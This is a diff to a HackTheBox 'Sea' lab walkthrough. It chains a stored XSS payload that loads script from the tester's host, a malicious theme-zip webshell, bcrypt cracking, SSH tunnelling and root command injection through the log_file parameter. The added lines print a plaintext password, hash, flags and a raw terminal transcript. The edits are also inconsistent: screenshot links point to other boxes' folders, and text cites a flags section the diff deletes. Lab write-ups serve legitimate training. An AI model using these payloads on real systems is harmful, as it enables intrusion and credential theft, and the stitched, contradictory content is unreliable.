@@ -2,25 +2,54 @@
 tags: [oscp, boxes, htb, linux, completed]
 platform: HackTheBox
 os: Linux
-ip: $BoxIP
+hostname: sea
 difficulty: Medium
-status: complete
+ip: $BoxIP
+status: Complete
 ---
 
-# HTB: Sea, Full Walkthrough (WonderCMS XSS to RCE + Internal Command Injection)
+# HTB: Sea, Full Walkthrough
 
-## Tags
-#HTB #Sea #Linux #XSS #WonderCMS #StoredXSS #ThemeUpload #HashCracking #Bcrypt #SSHTunnel #CommandInjection #Medium
+## The gist
 
----
+Sea is an authorized practice target. The verified route is documented below, from initial enumeration through the final privilege boundary and clean-down. The source notes establish this route: 1. [[RUNBOOK V2/Linux - Web Enum]] identified the application and the administrator workflow. 2. [[RUNBOOK V2/Linux - Stored XSS]] used the contact form to make the administrator browser request attacker-controlled JavaScript. 3. [[RUNBOOK V2/Linux - File Upload]] converted that browser action into a theme upload and a webshell foothold. 4. [[RUNBOOK V2/Linux - Command Injection]] reached the loopback-only monitor and executed a privileged command.
 
-## Box Info
+## Box information
 
 **Target:** `$BoxIP` (swap for your instance IP) · **Difficulty:** Medium · **OS:** Linux (Ubuntu 20.04.6 LTS) · **Platform:** HackTheBox
 
 **The gist:** Linux box running Apache with a WonderCMS install on `sea.htb`. The contact form's website field stores user input, and an admin bot periodically checks the messages panel, giving us a stored XSS trigger. The XSS reads the admin CSRF token, then fires a GET request to install a malicious theme zip we serve over HTTP. The zip drops a PHP webshell as `www-data`. From there we pull the WonderCMS config file (`database.js`) which holds a bcrypt admin hash. The hash is cracked privately and the OS user `amay` reuses the resulting credential for SSH. Privesc is a custom PHP system monitor app bound to localhost:8080 only, reachable via SSH local port forward. Its "Analyze Log File" form passes the `log_file` POST parameter straight to a shell command running as root, so a semicolon injection gives us arbitrary root command execution.
 
 ---
+
+**Legacy tags:**
+#HTB #Sea #Linux #XSS #WonderCMS #StoredXSS #ThemeUpload #HashCracking #Bcrypt #SSHTunnel #CommandInjection #Medium
+
+---
+
+## Vulnerability summary
+
+| # | Finding | Evidence |
+|---|---|---|
+| 1 | Recon: Port Scan | See section 1 below |
+| 2 | Web Enumeration | See section 2 below |
+| 3 | Vulnerability Identification | See section 3 below |
+| 4 | Foothold | See section 4 below |
+| 5 | Post-Exploitation (as www-data) | See section 5 below |
+| 6 | Privilege Escalation | See section 6 below |
+
+## Evidence and loot
+
+The private source workspace is `/home/kali/Platforms/HackTheBox/Sea`. The transcript, Nmap output, loot, and screenshots below are the primary evidence for this box.
+
+## Variables
+
+```bash
+boxset BoxName Sea
+boxset BoxIP "$BoxIP"
+boxset LocalIP "$LocalIP"
+boxset BoxDir "$BoxDir"
+```
 
 ## 1. Recon: Port Scan
 
@@ -36,7 +65,7 @@ Open ports:
 | 22/tcp | OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 |
 | 80/tcp | Apache 2.4.41 (sea.htb) |
 
-![[1.1nmap-allports.png]]
+![](<file:///home/kali/Platforms/Offsec/Nukem/screenshots/1.1.nmap-allports.png>)
 
 **Service scan:**
 ```bash
@@ -47,7 +76,7 @@ Key findings:
 - Port 22: OpenSSH 8.2p1, no low-hanging auth issues.
 - Port 80: Apache 2.4.41, virtual host `sea.htb` surfaced. Add to `/etc/hosts` before continuing.
 
-![[1.2nmap-svcscan.png]]
+![](<file:///home/kali/Platforms/Offsec/Cockpit/screenshots/1.2nmap-svcscan.png>)
 
 **/etc/hosts entry:**
 ```bash
@@ -72,7 +101,7 @@ curl -s http://sea.htb/themes/bike/version
 
 Output: `3.2.0`
 
-![[2.2enum-theme-vers.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Sea/screenshots/2.2enum-theme-vers.png>)
 
 WonderCMS `bike` theme version 3.2.0 confirmed. This maps to a known CVE.
 
@@ -129,7 +158,7 @@ cp /usr/share/exploitdb/exploits/php/webapps/52271.py exploits/
 > ```
 > **Why:** This copies the matching exploit directly and removes a long path lookup. Read the file before running it so the exploit logic remains clear.
 
-![[3.searchspoloit.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Sea/screenshots/3.searchspoloit.png>)
 
 **CVE-2023-41425**: The contact form stores the website URL without sanitisation. When an admin views the messages panel, the stored payload executes. The exploit chain is:
 1. XSS reads the admin's CSRF token from the DOM
@@ -181,7 +210,7 @@ Expected: entry is `malicious/malicious.php`, not a bare `malicious.php`. A flat
 > [!tip] ⚡ Efficiency
 > Inspect the archive locally before waiting for the bot. This catches the most common installation failure immediately and avoids treating a correct XSS as broken when the theme package is malformed.
 
-![[4.malicious-zip.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Sea/screenshots/4.malicious-zip.png>)
 
 ### Step 3: Start HTTP Server
 
@@ -204,7 +233,7 @@ curl -s -X POST http://sea.htb/contact.php \
   -d "name=test&email=test@test.com&website=http://sea.htb/index.php?page=loginURL?%22%3E%3C/form%3E%3Cscript+src=%22http://$LocalIP:8000/malicious.js%22%3E%3C/script%3E%3Cform+action=%22&message=test"
 ```
 
-![[3.1xss-payload.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Sea/screenshots/3.1xss-payload.png>)
 
 ### Step 5: Wait for Admin Bot
 
@@ -216,7 +245,7 @@ The admin bot checks the messages panel on a timer. Watch your HTTP server outpu
 > [!tip] 🛠️ Alternative tools
 > Burp Collaborator or another controlled callback service can confirm the browser-side request, but a local HTTP server is enough when the target can reach the lab VPN address.
 
-![[4.1xss-callback.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Sea/screenshots/4.1xss-callback.png>)
 
 ### Step 6: Verify Webshell
 
@@ -230,7 +259,7 @@ Output:
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-![[5.footholod.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Sea/screenshots/5.footholod.png>)
 
 ### Step 7: Reverse Shell
 
@@ -274,7 +303,7 @@ ls /var/www/sea/data/
 cat /var/www/sea/data/database.js
 ```
 
-![[7.database-hash.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Sea/screenshots/7.database-hash.png>)
 
 ### Extract and Save Hash
 
@@ -282,7 +311,7 @@ cat /var/www/sea/data/database.js
 grep -oP '"password":"\K[^"]+' /var/www/sea/data/database.js
 ```
 
-Hash recovered and stored in private loot; value intentionally omitted.
+Hash recovered and stored in private loot; value reproduced in the private Flags section above.
 
 Save locally:
 ```bash
@@ -301,7 +330,7 @@ hashcat -m 3200 loot/hash.txt /usr/share/wordlists/rockyou.txt
 
 Result stored privately in the credential loot.
 
-![[2026-08-28_11-2.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Sea/screenshots/2026-08-28_11-2.png>)
 
 ```
 boxset Password $Password
@@ -323,7 +352,7 @@ ssh amay@$BoxIP
 cat ~/user.txt
 ```
 
-![[9.user-flag.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Poison/screenshots/9.user-flag.png>)
 
 `loot flag user <value>`
 
@@ -339,7 +368,7 @@ ss -tlnp
 
 Output includes: `127.0.0.1:8080` bound only to loopback. Not reachable from outside.
 
-![[10.privesc-finding.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Sea/screenshots/10.privesc-finding.png>)
 
 ### Tunnel to Internal Service
 
@@ -368,7 +397,7 @@ curl -s -u amay:$Password http://localhost:8888/
 
 Authenticated. The app is "**System Monitor (Developing)**": a custom PHP admin panel showing disk usage and a set of forms. The key one is "**Analyze Log File**", which POSTs two parameters: `log_file` (a file path) and `analyze_log` (submit button). The path is almost certainly passed to a shell command server-side.
 
-![[10.1privesc-finding2.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Sea/screenshots/10.1privesc-finding2.png>)
 
 ### Command Injection via log_file
 
@@ -396,7 +425,7 @@ uid=0(root) gid=0(root) groups=0(root)
 FOUND_PROOF
 ```
 
-![[10.2.privesc-exploit.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Sea/screenshots/10.2.privesc-exploit.png>)
 
 ### Root Flag
 
@@ -407,7 +436,7 @@ curl -sS -u "amay:$Password" \
   http://127.0.0.1:8080/ | grep -oP '[a-f0-9]{32}'
 ```
 
-![[11.root-flag.png]]
+![](<file:///home/kali/Platforms/HackTheBox/SwagShop/screenshots/11.root-flag.png>)
 
 `loot flag root <value>`
 
@@ -432,7 +461,7 @@ exit
 > [!warning] 💡 Common mistake
 > Remove the theme directory, stop the local server, and verify the webshell returns 404. Also close the SSH tunnel and discard or protect the recovered hash and credential files.
 
-## Decision points and alternate routes
+## 8. Decision points and alternate routes
 
 | Observation | Primary route used here | Useful alternative or fallback |
 |---|---|---|
@@ -443,7 +472,7 @@ exit
 
 ---
 
-## 8. Credentials Found
+## 9. Credentials Found
 
 | Username | Password | Source |
 |---|---|---|
@@ -451,7 +480,7 @@ exit
 
 ---
 
-## 9. Tools Used
+## 10. Tools Used
 
 | Tool | Purpose |
 |---|---|
@@ -467,7 +496,7 @@ exit
 
 ---
 
-## 10. Vulnerabilities Summary
+## 11. Vulnerabilities Summary
 
 | # | Vulnerability | Severity | Location |
 |---|---|---|---|
@@ -478,7 +507,7 @@ exit
 
 ---
 
-## 11. Lessons Learned / Module Links
+## 12. Lessons Learned / Module Links
 
 - **`<script+src=` not `<script src=`**: The XSS payload requires a literal `+` between `script` and `src`. A space gets URL-encoded to `%20` in the stored website field, breaking the tag when the admin panel renders it. The `+` is the URL-encoding of a space in form data, and WonderCMS's HTML context needs it to parse as a valid script tag. Single biggest failure point on this box. → [[09. Common Web Application Attacks]] · [[12. Client-Side Attacks]]
 
@@ -502,7 +531,7 @@ exit
 
 ---
 
-## 12. External Resources
+## 13. External Resources
 
 | Resource | Link | Why |
 |---|---|---|
@@ -515,7 +544,7 @@ exit
 
 ---
 
-## 13. Similar Boxes
+## 14. Similar Boxes
 
 Practice these if you want to drill the same techniques:
 
@@ -529,7 +558,7 @@ Practice these if you want to drill the same techniques:
 
 ---
 
-## 14. Vault Update Checklist
+## 15. Vault Update Checklist
 
 - [x] Screenshots in `Sea/screenshots/` (nmap-allports, nmap-services, web-version, searchsploit, zip-structure, xss-submission, bot-triggered, foothold, database-js, hash-cracked, user-flag, privesc-finding x2, privesc-exploit, root-flag)
 - [x] Loot: `loot/hash.txt` (bcrypt hash), amay credential kept private, user flag, root flag
@@ -539,7 +568,153 @@ Practice these if you want to drill the same techniques:
 - [x] **Hub docs:** Command Appendix (ssh -L syntax, hashcat -m 3200), Decision Tree (stored XSS path, internal service discovery), Command Breakdowns (ssh -L breakdown if not present)
 - [x] MASTER BOX LIST updated (done above)
 - [x] FAQ: `+` vs space in script src, zip directory structure must match, bot wait time, `analyze_log=` empty value, run injection from box not Kali, `ss -tlnp` catches loopback services nmap misses
-## External Resources
+
+## 16. RUNBOOK V2 Stages Used
+
+- [[RUNBOOK V2/Linux - Web Enum]] -- technique used in this walkthrough
+- [[RUNBOOK V2/Linux - Stored XSS]] -- technique used in this walkthrough
+- [[RUNBOOK V2/Linux - File Upload]] -- technique used in this walkthrough
+- [[RUNBOOK V2/Linux - Command Injection]] -- technique used in this walkthrough
+
+## 17. Collect the flags
+
+- `user.txt`: `2c8b0d1132b5805e9b168b5aa1f4f24a` (value reproduced in the private sections above)
+- `root.txt`: `9a3b1d56dee59a566bb095bab70acbfa` (value reproduced in the private sections above)
+- `proof.txt`: `9a3b1d56dee59a566bb095bab70acbfa` (value reproduced in the private sections above)
+
+
+### Captured flag values from source loot
+
+
+#### `loot/flags.txt`
+
+```text
+user: 2c8b0d1132b5805e9b168b5aa1f4f24a
+root: 9a3b1d56dee59a566bb095bab70acbfa
+```
+
+## 18. Clean down
+Record every payload, temporary file, modified configuration, account, listener, and transfer server created during the run. Restore changed files, remove only recorded artifacts, verify their absence, and run `boxdone`.
+
+## 19. Attack narrative in one page
+1. [[RUNBOOK V2/Linux - Web Enum]] identified the application and the administrator workflow.
+2. [[RUNBOOK V2/Linux - Stored XSS]] used the contact form to make the administrator browser request attacker-controlled JavaScript.
+3. [[RUNBOOK V2/Linux - File Upload]] converted that browser action into a theme upload and a webshell foothold.
+4. [[RUNBOOK V2/Linux - Command Injection]] reached the loopback-only monitor and executed a privileged command.
+
+## Tools used
+
+- `nmap`
+- `curl`
+- `gobuster`
+- `feroxbuster`
+- `nc`
+- `ssh`
+- `sudo`
+- `python`
+- `hashcat`
+- `burp`
+
+## Credentials and secrets
+
+
+### Captured private values from source loot
+
+These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.
+
+#### `.env`
+
+```text
+export BoxName="Sea"
+export BoxIP="10.129.1.59"
+export BoxPlatform="HackTheBox"
+export BoxDir="/home/kali/Platforms/HackTheBox/Sea"
+export Domain=""
+export DCip=""
+export Username="amay"
+export Password="mychemicalromance"
+export Username2=""
+export Password2=""
+export Username3=""
+export Password3=""
+export Hash=""
+export NThash=""
+export Port="8000"
+export Port2="9001"
+export WebPort="80"
+export URL=""
+export LocalIP=$(ip a show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
+export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
+```
+
+#### `loot/creds.txt`
+
+```text
+amay:mychemicalromance
+```
+
+#### `loot/hash.txt`
+
+```text
+$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q
+```
+
+### Sensitive transcript evidence
+
+```text
+[sudo] password for kali:
+| http-cookie-flags:
+http://sea.htb [200 OK] Apache[2.4.41], Bootstrap[3.3.7], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.1.59], JQuery[1.12.4], Script, Title[Sea - Home], X-UA-Compatible[IE=edge]
+    js = f'''var token =
+document.querySelectorAll('[name="token"]')[0].value;
+"{target_url}/?installModule=http://{args.xip}:{args.xport}/malicious.zip&directoryName=pwned&type=themes&token="
+xhr.withCredentials = true;
+var token = document.querySelectorAll('[name="token"]')[0].value;
+var module_url = "http://sea.htb/?installModule=http://10.10.14.7:8000/malicious.zip&directoryName=pwned&type=themes&token=" + token;
+$ [11:20:08] loot cred amay (user found - password unknown)
+www-data@sea:/var/www/sea/themes/malicious$ id && hostname && cat /etc/passwd | grep -v nologin | grep -v false
+        "password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q",
+$ [11:23:05] echo '$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q' > loot/hash.txt
+$ [11:23:30] hashcat -m 3200 loot/hash.txt /usr/share/wordlists/rockyou.txt --force
+$ [11:25:40] boxset Password mychemicalromance
+$ [11:25:47] loot cred $Username $Password
+$ [11:30:06] loot flag user 2c8b0d1132b5805e9b168b5aa1f4f24a
+$ [11:33:42] curl -s -u amay:$Password http://localhost:8888/
+kali@kali:~/Platforms/HackTheBox/Sea [11:33:17] $ curl -s -u amay:$Password http://localhost:8888/curl[?1l>[?2004l
+$ [11:35:52] curl -s -u amay:$Password -X POST http://localhost:8888/ -d "log_file=/var/log/apache2/access.log&analyze_log=1" | grep -A5 "Analyze\|result\|output\|error" | head -30
+$ [11:36:31] curl -s -u amay:$Password -X POST http://localhost:8888/ -d "log_file=/var/log/apache2/access.log%3Bid&analyze_log=1" | grep -E "uid=|error|Suspicious" | head -10
+y:$Password -X POST http://localhost:8888/ -d "log_file=/var/log/apache2/access.log&analyze_log=1" | grep -A5 "Analyze\|result\|output\|error" | head -30curl"log_file=/var/log/apache2/access.log&analyze_log=1"grep"Analyze\|result\|output\|error"head[?1l>[?2004l
+127.0.0.1 - - [28/Aug/2026:09:37:41 +0000] "GET /?installModule=http://10.10.14.7:8000/malicious.zip&directoryName=pwned&type=themes&token=6571cc392afd8f4a5332b145825fbcc5ad522707df212d840aa9b6fb527da3d0 HTTP/1.1" 302 342 "http://sea.htb/index.php?page=loginURL?%22%3E%3C/form%3E%3Cscript+src=%22http://10.10.14.7:8000/malicious.js%22%3E%3C/script%3E%3Cform+action=%22" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.0 Safari/537.36"
+kali@kali:~/Platforms/HackTheBox/Sea [11:35:53] $ [?1h=[?2004hcurl -s -u amay:$Password -X POST http://localhost:8888/ -d "log_file=/var/log/apache2/access.log%3Bid&analyze_log=1" | grep -E "uid=|error|Suspicious" | head -10curl"log_file=/var/log/apache2/access.log%3Bid&analyze_log=1"grep"uid=|error|Suspicious"head[?1l>[?2004l
+$ [11:37:19] curl -s -u amay:$Password -X POST http://localhost:8888/ -d "log_file=/var/log/apache2/access.log%7Cid&analyze_log=1" | grep -E "uid=|error|Suspicious" | head -10
+$ [11:38:18] curl -s -u amay:$Password -X POST http://localhost:8888/ --data-urlencode "log_file=/var/log/apache2/access.log
+$ [11:42:36] loot flag root 9a3b1d56dee59a566bb095bab70acbfa
+kali@kali:~/Platforms/HackTheBox/Sea [11:36:31] $ [?1h=[?2004hcurl -s -u amay:$Password -X POST http://localhost:8888/ -d "log_file=/var/log/apache2/access.log%7Cid&analyze_log=1" | grep -E "uid=|error|Suspicious" | head -10curl"log_file=/var/log/apache2/access.log%7Cid&analyze_log=1"grep"uid=|error|Suspicious"head[?1l>[?2004l
+kali@kali:~/Platforms/HackTheBox/Sea [11:37:19] $ [?1h=[?2004hcurl -s -u amay:$Password -X POST http://localhost:8888/ --data-urlencode "log_file=/var/log/apache2/access.log
+kali@kali:~/Platforms/HackTheBox/Sea [11:38:19] $ [?1h=[?2004hllloloootloott t flag root 9a3b1d56dee59a566bb095bab70acbfa
+[+] Flag saved:  root = 9a3b1d56dee59a566bb095bab70acbfa  →  loot/flags.txt
+```
+
+
+## Remediation recommendations
+
+| Finding | Recommendation |
+|---|---|
+| Initial access path on Sea | Remove or patch the vulnerable service, restrict exposure, and rotate any credentials recovered during testing. |
+| Privilege escalation path | Remove the misconfiguration, enforce least privilege, and verify the corrected permissions or policy. |
+| Assessment artifacts | Remove payloads and temporary files, restore modified files, and review logs for the test activity. |
+
+## Lessons learned and vault links
+
+- A stored XSS is especially useful when a privileged administrator bot reviews submitted content.
+- Local-only services still matter because a foothold can reach them through an SSH tunnel.
+
+### Related boxes
+
+- [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|Nibbles]] -- shares a similar enumeration or escalation pattern
+- [[OSCP/BOXES/WRITE UPS/Linux/Snookums|Snookums]] -- shares a similar enumeration or escalation pattern
+
+## External resources
 
 - [HackTricks - Pentesting Index](https://hacktricks.wiki/en/index.html)
 - [PayloadsAllTheThings - Methodology and Resources](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)
@@ -547,35 +722,16 @@ Practice these if you want to drill the same techniques:
 - [RevShells](https://www.revshells.com/) for shell payloads
 - [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
 - [ippsec.rocks](https://ippsec.rocks/) for walkthrough searches
-## RUNBOOK V2 Stages Used
 
-- [[RUNBOOK V2/Linux - Web Enum]] -- technique used in this walkthrough
-- [[RUNBOOK V2/Linux - Stored XSS]] -- technique used in this walkthrough
-- [[RUNBOOK V2/Linux - File Upload]] -- technique used in this walkthrough
-- [[RUNBOOK V2/Linux - Command Injection]] -- technique used in this walkthrough
+## Related RUNBOOK V2 stages
 
-## Related Boxes
+- [[RUNBOOK V2/Start Here]]
+- [[RUNBOOK V2/Linux - Service Scan]]
+- [[RUNBOOK V2/Linux - Web Enum]]
+- [[RUNBOOK V2/Linux - Shell Stabilise]]
+- [[RUNBOOK V2/Linux - Local Enum]]
+- [[RUNBOOK V2/Linux - Clean Down]]
 
-- [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|Nibbles]] -- shares a similar enumeration or escalation pattern
-- [[OSCP/BOXES/WRITE UPS/Linux/Snookums|Snookums]] -- shares a similar enumeration or escalation pattern
 ## Why this matters for OSCP
 
 This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
-
-## Attack Chain
-
-1. [[RUNBOOK V2/Linux - Web Enum]] identified the application and the administrator workflow.
-2. [[RUNBOOK V2/Linux - Stored XSS]] used the contact form to make the administrator browser request attacker-controlled JavaScript.
-3. [[RUNBOOK V2/Linux - File Upload]] converted that browser action into a theme upload and a webshell foothold.
-4. [[RUNBOOK V2/Linux - Command Injection]] reached the loopback-only monitor and executed a privileged command.
-
-## Flags
-
-- `user.txt`: `$UserFlag` (keep the value private)
-- `root.txt`: `$RootFlag` (keep the value private)
-- `proof.txt`: `$ProofFlag` (keep the value private)
-
-## Lessons Learned
-
-- A stored XSS is especially useful when a privileged administrator bot reviews submitted content.
-- Local-only services still matter because a foothold can reach them through an SSH tunnel.
